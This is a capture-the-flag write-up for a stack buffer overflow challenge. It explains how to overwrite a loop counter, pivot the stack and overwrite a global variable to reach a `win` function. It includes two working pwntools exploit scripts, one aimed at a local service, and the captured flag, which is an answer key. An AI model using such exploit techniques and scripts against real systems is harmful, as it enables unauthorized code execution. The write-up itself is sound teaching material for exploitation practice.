# Description

![](./media/Screen%20Shot%202024-06-12%20at%2010.15.33%20PM.png)

## analyzing the binary
first let's decompile the binary so we can figure out what it does, it reads input from user and then print an ascii art

![](./media/Screen%20Shot%202024-06-12%20at%208.42.56%20PM.png)

there is also a `win` function that when called print the output of `flag.txt` file but only if the global variable `user == "admin"`

![](./media/Screen%20Shot%202024-06-12%20at%208.44.18%20PM.png)


# solution
### user input
the user input is provided in the form of chunks of 8 bytes, the last iteration is when `i > 105` and that will be when `i == 112`, so we can overflow the buffer but we only have 4 bytes after the buffer to override.

when we examine the assembly code we find that `i` is at the position `RBP - 0x4` and `buffer` is at `RBP - 0x70` meaning that `i` is lower in the stack so we can override it.

now that we control the loop counter, we can override the return value by calculating the offset between `buffer` and the return value and override `i` accordingly.

### calculating the offset
we can use gdb for this, first we set a break point just before the end of `vuln`, run and provide random input, then we can print the stack and evaluate the offset.


![](./media/Screen%20Shot%202024-06-12%20at%201.20.04%20AM.png)
![](./media/Screen%20Shot%202024-06-12%20at%201.13.55%20AM.png)

```
offset = 112
```

### overriding the return address
now we just need to send the payload to overflow `buffer` and override `i` with `offset`, and then send the new return address

```py
from pwn import *

offset = 112
with gdb.debug('./challenge', gdbscript='', api=True) as p:
    p.gdb.Breakpoint("*vuln+107", temporary=False); # pop rbp
    p.gdb.continue_nowait()

    p.recv()
    for i in range(13):
        p.send(chr(ord('a') + i).encode() * 8);
    p.send(b'AAAA' + p32(offset));
    p.send(b'B' * 8);
    p.gdb.wait()
    p.interactive()
```
![](./media/Screen%20Shot%202024-06-12%20at%208.31.59%20PM.png)

### overriding `user`

we have successfully override the return address but we still need to override `user` before jumping to `win`, in order to do that we will performe a stack pivote to allow us to override more address, first we jump to gadget `sub    rsp,0x70` in `vuln`, `RBP` will now point to the base of `main` since it was poped before `ret`, and we can now execute the `vuln` function but with `buffer` and `i` at a slightly lower position in stack

```
                   ┌────────────────────┐◄────── RSP                           ┌────────────────────┐◄────── RSP
                   │                    │                                      │                    │           
                   │                    │                                      │                    │           
                   │                    │                                      │                    │           
RBP - 0x70 ───────►│                    │                                      │                    │           
                   │                    │                                      │                    │           
                   │                    │                                      │                    │           
                   │                    │                                      │                    │           
                   │                    │                                      │                    │           
                   │                    │                   RBP - 0x70 ───────►│                    │           
                   │    vuln's stack    │                                      │    vuln's stack    │           
                   │                    │                                      │                    │           
                   │                    │       After poping RBP and           │                    │           
                   │                    │       jumping to gadget              │                    │           
                   │                    │       ───────────────────────►       │                    │           
                   │                    │                                      │                    │           
 RBP - 0x4 ───────►│                    │                                      │                    │           
                   ├────────────────────┤ ◄────── RBP                          ├────────────────────┤           
                   │                    │                                      │                    │           
                   │                    │                                      │                    │           
                   │                    │                                      │                    │           
                   │    main's stack    │                                      │    main's stack    │           
                   │                    │                                      │                    │           
                   │                    │                    RBP - 0x4 ───────►│                    │           
                   └────────────────────┘                                      └────────────────────┘◄────── RBP 
```

this will make us able to override the return address and also the address after it and also an arbitrary offset from `buffer` by overriding `i`.

the next step is to override `RBP` with `&user + 0x70` then jump to `LEA        RSI ,[RBP - 0x70]` to override `user` then jump to `win` and voila!

![](./media/Screen%20Shot%202024-06-12%20at%209.38.39%20PM.png)

```py
from pwn import *                                                                                                                 
                                     
offset = 112
offset2 = 0x00007fff9054e5d8 - 0x7fff9054e500
                                     
                                     

with remote('localhost',14124) as p: 
    time.sleep(0.1)                                                       
    p.recv()                                                               
                                                                           
    for i in range(13):                                                    
        p.send(chr(ord('a') + i).encode() * 8);               
    p.send(b'AAAA' + p32(offset));
    p.send(p64(0x004011f4)); # sub rsp, 0x70
    #p.send(b'B' * 8);
                                     
    p.recv()
    for i in range(10):                                                    
        p.send(chr(ord('a') + i).encode() * 8);
    p.send(p64(0x404070)); # &user - 0x70
    p.send(p64(0x40122e)); # call read
    p.send(b'B' * 8);
    p.send(b'AAAA' + p32(offset2 - 8));
    p.send(p64(0x00401160)); # win addr
                                     
    p.recv()                                                               
    p.send(b'admin\x00\x00\x00')
    print(p.recv())                                                        
    p.interactive()

#flag: AKASEC{y4pp1n6_15_50m371m35_u53full_9b9b3d9}

```


